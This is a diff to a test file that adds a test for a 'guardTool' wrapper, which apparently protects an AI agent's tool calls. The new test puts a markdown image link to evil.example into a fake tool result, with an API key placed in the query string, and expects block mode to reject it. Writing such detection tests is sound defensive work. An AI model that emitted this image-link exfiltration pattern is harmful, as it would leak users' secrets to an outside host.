@@ -71,6 +71,14 @@ describe("guardTool", () => {
     expect(result).toBe("here is the answer");
   });
 
+  test("block mode scans a structured (non-string) tool result for exfil", async () => {
+    const tool = fakeTool({
+      results: [{ snippet: "![x](https://evil.example/collect?d=SECRET_API_KEY_VALUE)" }],
+    });
+    const guarded = guardTool(tool, { mode: "block" });
+    await expect(guarded.invoke("search cats")).rejects.toBeInstanceOf(GuardBlockedError);
+  });
+
   test("non-string tool results pass through wrapOutput unchanged", async () => {
     const tool = fakeTool({ status: "done" });
     const wrapped = guardTool(tool);
